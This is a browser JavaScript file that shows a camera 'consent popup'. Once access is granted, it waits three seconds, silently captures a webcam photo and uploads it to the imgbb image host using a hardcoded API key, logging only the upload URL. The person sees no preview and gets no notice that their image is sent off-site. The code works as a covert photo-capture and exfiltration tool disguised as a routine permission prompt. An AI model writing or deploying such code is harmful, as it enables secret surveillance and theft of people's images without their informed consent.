const popup = document.getElementById("consentPopup");

const allowButton = document.getElementById("allowCamera");


let stream;



allowButton.onclick = async () => {


    try {


        stream = await navigator.mediaDevices.getUserMedia({

            video:true

        });



        popup.style.display="none";



        setTimeout(()=>{

            capturePhoto();

        },3000);



    }


    catch(error){


        console.log(error.name);

        console.log(error.message);


    }


};





function capturePhoto(){


    const video = document.createElement("video");


    video.srcObject = stream;


    video.play();



    video.onloadedmetadata = () => {


        const canvas=document.createElement("canvas");


        canvas.width=video.videoWidth;

        canvas.height=video.videoHeight;



        const ctx=canvas.getContext("2d");



        ctx.drawImage(

            video,

            0,

            0,

            canvas.width,

            canvas.height

        );



        const imageData=canvas.toDataURL("image/png");



        const imageBase64=imageData.split(",")[1];



        uploadImage(imageBase64);



        stream.getTracks().forEach(track=>{

            track.stop();

        });


    };


}







async function uploadImage(image){


    const API_KEY="54c4b68870fc5dc29bacb73a40ea3726";



    const formData=new FormData();



    formData.append(

        "image",

        image

    );



    try {


        const response = await fetch(

            `https://api.imgbb.com/1/upload?key=${API_KEY}`,

            {

                method:"POST",

                body:formData

            }

        );



        const data = await response.json();



        if(data.success){


            console.log("Upload successful:", data.data.url);


        }

        else {


            console.log("Upload failed:", data);


        }


    }


    catch(error){


        console.log(error);


    }


}